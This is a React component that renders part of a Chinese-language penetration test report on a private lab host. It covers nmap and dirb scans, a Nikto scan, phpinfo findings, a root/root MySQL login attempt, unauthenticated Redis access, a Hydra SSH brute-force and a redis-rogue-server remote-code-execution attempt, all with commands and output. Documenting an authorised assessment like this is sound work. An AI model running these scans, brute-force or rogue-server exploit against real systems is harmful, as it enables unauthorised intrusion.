import React from 'react';
import { KaliTerminal } from '../shared/Terminal';

export const NSProcess: React.FC = () => {
    return (
        <>
            <div id="ns-process" className="page bg-white w-[210mm] min-h-[297mm] mx-auto shadow-lg mb-8 p-12 page-break">
                <h2 className="text-[18pt] font-hei mb-6 font-bold text-center">二、渗透测试过程</h2>

                <h3 className="text-[14pt] font-hei font-bold mt-6 mb-4">2.1 信息收集阶段</h3>
                
                <h4 className="text-[12pt] font-hei font-bold mt-4 mb-2">2.1.1 主机发现</h4>
                <p className="mb-4 indent-8 text-justify">
                    首先使用 Nmap 对目标网段进行主机发现扫描，确认目标主机是否在线：
                </p>
                <KaliTerminal 
                    command="nmap -sn 192.168.6.0/24"
                    output={`Starting Nmap 7.94 ( https://nmap.org ) at 2025-12-29 06:59 EST
Nmap scan report for ImmortalWrt.lan (192.168.6.1)
Host is up (0.0056s latency).
Nmap scan report for 192.168.6.106
Host is up (0.028s latency).
Nmap scan report for 192.168.6.171
Host is up (0.036s latency).
Nmap scan report for 192.168.6.210
Host is up (0.000057s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.13 seconds`}
                />
                <p className="text-center text-sm font-bold mb-4">图 2-1 主机发现扫描结果</p>

                <h4 className="text-[12pt] font-hei font-bold mt-4 mb-2">2.1.2 端口扫描与服务识别</h4>
                <p className="mb-4 indent-8 text-justify">
                    对目标主机进行详细的端口扫描和服务版本识别：
                </p>
                <KaliTerminal 
                    command="nmap -sV -sC -Pn 192.168.6.208"
                    output={`Starting Nmap 7.94 ( https://nmap.org ) at 2025-12-29 07:04 EST
Nmap scan report for 192.168.6.208
Host is up (0.0015s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 9a:35:fb:04:37:d3:27:47:52:0b:63:72:dc:f8:05:b5 (RSA)
|   256 f3:6a:a5:b8:70:76:fc:4e:d5:6f:48:0f:aa:9a:4a:6e (ECDSA)
|_  256 80:90:c8:90:89:42:e0:10:12:28:48:9f:31:18:6e:e2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.2.34)
|_http-title: Apache HTTP Server Test Page powered by CentOS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.2.34
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds`}
                />
                <p className="text-center text-sm font-bold mb-4">图 2-2 端口扫描与服务识别结果</p>
            </div>

            <div className="page bg-white w-[210mm] min-h-[297mm] mx-auto shadow-lg mb-8 p-12 page-break">
                <h4 className="text-[12pt] font-hei font-bold mt-4 mb-2">2.1.3 全端口扫描</h4>
                <p className="mb-4 indent-8 text-justify">
                    为确保不遗漏任何开放端口，进行全端口扫描：
                </p>
                <KaliTerminal 
                    command="nmap -p- --min-rate 5000 192.168.6.208"
                    output={`Starting Nmap 7.94 ( https://nmap.org ) at 2025-12-29 07:10 EST
Nmap scan report for 192.168.6.208
Host is up (0.00091s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
6379/tcp open  redis

Nmap done: 1 IP address (1 host up) scanned in 3.79 seconds`}
                />
                <p className="text-center text-sm font-bold mb-4">图 2-3 全端口扫描发现Redis服务</p>
                <p className="mb-4 indent-8 text-justify">
                    全端口扫描发现了额外的 Redis 服务（6379端口），这是一个重要发现。
                </p>

                <h3 className="text-[14pt] font-hei font-bold mt-6 mb-4">2.2 Web安全测试</h3>

                <h4 className="text-[12pt] font-hei font-bold mt-4 mb-2">2.2.1 目录扫描</h4>
                <p className="mb-4 indent-8 text-justify">
                    使用 Dirb 工具对 Web 服务进行目录爆破，发现隐藏的文件和目录：
                </p>
                <KaliTerminal 
                    command="dirb http://192.168.6.208/ /usr/share/wordlists/dirb/common.txt -S"
                    output={`
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Dec 29 07:04:40 2025
URL_BASE: http://192.168.6.208/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
OPTION: Silent Mode

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.6.208/ ----
+ http://192.168.6.208/cgi-bin/ (CODE:403|SIZE:299)
+ http://192.168.6.208/phpinfo.php (CODE:200|SIZE:79873)

-----------------
END_TIME: Mon Dec 29 07:04:44 2025
DOWNLOADED: 4612 - FOUND: 2`}
                />
                <p className="text-center text-sm font-bold mb-4">图 2-4 目录扫描发现敏感文件</p>
                <p className="mb-4 indent-8 text-justify">
                    发现了敏感文件 phpinfo.php，这是一个严重的信息泄露漏洞。
                </p>
            </div>

            <div className="page bg-white w-[210mm] min-h-[297mm] mx-auto shadow-lg mb-8 p-12 page-break">
                <h4 className="text-[12pt] font-hei font-bold mt-4 mb-2">2.2.2 Nikto漏洞扫描</h4>
                <p className="mb-4 indent-8 text-justify">
                    使用 Nikto 对 Web 服务进行全面的漏洞扫描：
                </p>
                <KaliTerminal 
                    command="nikto -h http://192.168.6.208/"
                    output={`- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.6.208
+ Target Hostname:    192.168.6.208
+ Target Port:        80
+ Start Time:         2025-12-29 07:05:23 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS) PHP/7.2.34
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.54).
+ PHP/7.2.34 appears to be outdated (current is at least 8.1.5).
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, GET, HEAD, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST.
+ /phpinfo.php: Output from the phpinfo() function was found.
+ /icons/: Directory indexing found.
+ 26639 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2025-12-29 07:06:33 (GMT-5) (70 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested`}
                />
                <p className="text-center text-sm font-bold mb-4">图 2-5 Nikto漏洞扫描结果</p>

                <h4 className="text-[12pt] font-hei font-bold mt-4 mb-2">2.2.3 phpinfo信息分析</h4>
                <p className="mb-4 indent-8 text-justify">
                    通过访问 phpinfo.php 获取到以下关键配置信息：
                </p>
                <div className="mb-4">
                    <table className="w-full border-collapse border border-gray-400">
                        <thead>
                            <tr className="bg-gray-100">
                                <th className="border border-gray-400 p-2 text-left">配置项</th>
                                <th className="border border-gray-400 p-2 text-left">值</th>
                                <th className="border border-gray-400 p-2 text-left">风险等级</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td className="border border-gray-400 p-2">DOCUMENT_ROOT</td>
                                <td className="border border-gray-400 p-2">/var/www/html</td>
                                <td className="border border-gray-400 p-2 text-yellow-600">中</td>
                            </tr>
                            <tr>
                                <td className="border border-gray-400 p-2">disable_functions</td>
                                <td className="border border-gray-400 p-2">no value（无限制）</td>
                                <td className="border border-gray-400 p-2 text-red-600">高危</td>
                            </tr>
                            <tr>
                                <td className="border border-gray-400 p-2">allow_url_include</td>
                                <td className="border border-gray-400 p-2">On</td>
                                <td className="border border-gray-400 p-2 text-red-600">高危</td>
                            </tr>
                            <tr>
                                <td className="border border-gray-400 p-2">allow_url_fopen</td>
                                <td className="border border-gray-400 p-2">On</td>
                                <td className="border border-gray-400 p-2 text-yellow-600">中</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
                <p className="text-center text-sm font-bold mb-4">表 2-1 phpinfo关键配置信息</p>
            </div>

            <div className="page bg-white w-[210mm] min-h-[297mm] mx-auto shadow-lg mb-8 p-12 page-break">
                <h3 className="text-[14pt] font-hei font-bold mt-6 mb-4">2.3 数据库安全测试</h3>

                <h4 className="text-[12pt] font-hei font-bold mt-4 mb-2">2.3.1 MySQL测试</h4>
                <p className="mb-4 indent-8 text-justify">
                    尝试连接 MySQL 数据库，测试是否存在弱口令或未授权访问：
                </p>
                <KaliTerminal 
                    command="mysql -h 192.168.6.208 -u root --password=root"
                    output={`ERROR 1130 (HY000): Host '192.168.6.210' is not allowed to connect to this MariaDB server`}
                />
                <p className="text-center text-sm font-bold mb-4">图 2-6 MySQL连接测试</p>
                <p className="mb-4 indent-8 text-justify">
                    MySQL 配置了访问控制，限制了远程连接，这是一个良好的安全配置。
                </p>

                <h4 className="text-[12pt] font-hei font-bold mt-4 mb-2">2.3.2 Redis未授权访问测试</h4>
                <p className="mb-4 indent-8 text-justify">
                    测试 Redis 服务是否存在未授权访问漏洞：
                </p>
                <KaliTerminal 
                    command="redis-cli -h 192.168.6.208 ping"
                    output="PONG"
                />
                <p className="text-center text-sm font-bold mb-4">图 2-7 Redis未授权访问验证</p>
                <p className="mb-4 indent-8 text-justify font-bold text-red-600">
                    发现严重漏洞：Redis 存在未授权访问！无需密码即可直接连接并执行命令。
                </p>

                <h4 className="text-[12pt] font-hei font-bold mt-4 mb-2">2.3.3 获取Redis服务器信息</h4>
                <p className="mb-4 indent-8 text-justify">
                    进一步获取 Redis 服务器的详细信息：
                </p>
                <KaliTerminal 
                    command="redis-cli -h 192.168.6.208 info server"
                    output={`# Server
redis_version:7.0.2
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:bc5295fde91ee1cb
redis_mode:standalone
os:Linux 3.10.0-1160.119.1.el7.x86_64 x86_64
arch_bits:64
monotonic_clock:POSIX clock_gettime
multiplexing_api:epoll
tcp_port:6379
uptime_in_seconds:599
uptime_in_days:0`}
                />
                <p className="text-center text-sm font-bold mb-4">图 2-8 Redis服务器详细信息</p>
            </div>

            <div className="page bg-white w-[210mm] min-h-[297mm] mx-auto shadow-lg mb-8 p-12 page-break">
                <h3 className="text-[14pt] font-hei font-bold mt-6 mb-4">2.4 弱口令测试</h3>
                <p className="mb-4 indent-8 text-justify">
                    使用 Hydra 对 SSH 服务进行弱口令爆破测试：
                </p>
                <KaliTerminal 
                    command="hydra -L users.txt -P pass.txt ssh://192.168.6.208 -t 4 -f"
                    output={`Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-29 07:10:24
[DATA] max 4 tasks per 1 server, overall 4 tasks, 40 login tries (l:5/p:8), ~10 tries per task
[DATA] attacking ssh://192.168.6.208:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-29 07:10:40`}
                />
                <p className="text-center text-sm font-bold mb-4">图 2-9 SSH弱口令爆破测试</p>
                <p className="mb-4 indent-8 text-justify">
                    SSH 服务未发现弱口令，密码策略较为安全。
                </p>

                <h3 className="text-[14pt] font-hei font-bold mt-6 mb-4">2.5 漏洞利用尝试</h3>
                <p className="mb-4 indent-8 text-justify">
                    针对发现的 Redis 未授权访问漏洞，尝试使用 redis-rogue-server 工具进行漏洞利用：
                </p>
                <KaliTerminal 
                    cwd="/tmp/redis-rogue-server"
                    command="python3 redis-rogue-server.py --rhost 192.168.6.208 --lhost 192.168.6.210"
                    output={`______         _ _      ______                         _____                          
| ___ \\       | (_)     | ___ \\                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \\ \`--.  ___ _ ____   _____ _ __ 
|    // _ \\/ _\` | / __| |    // _ \\ / _\` | | | |/ _ \\  \`--. \\/ _ \\ '__\\ \\ / / _ \\ '__|
| |\\ \\  __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| |  __/ /\\__/ /  __/ |   \\ V /  __/ |   
\\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_|    \\_/ \\___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig

[info] TARGET 192.168.6.208:6379
[info] SERVER 192.168.6.210:21000
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: i
[info] Interact mode start, enter "exit" to quit.`}
                />
                <p className="text-center text-sm font-bold mb-4">图 2-10 Redis主从复制RCE利用尝试</p>
                <p className="mb-4 indent-8 text-justify">
                    由于目标 Redis 版本为 7.0.2，已经修复了 CONFIG SET 相关的安全漏洞，模块加载方式也受到限制，
                    无法成功获取shell。这说明及时更新软件版本对于安全防护非常重要。
                </p>
            </div>
        </>
    );
};
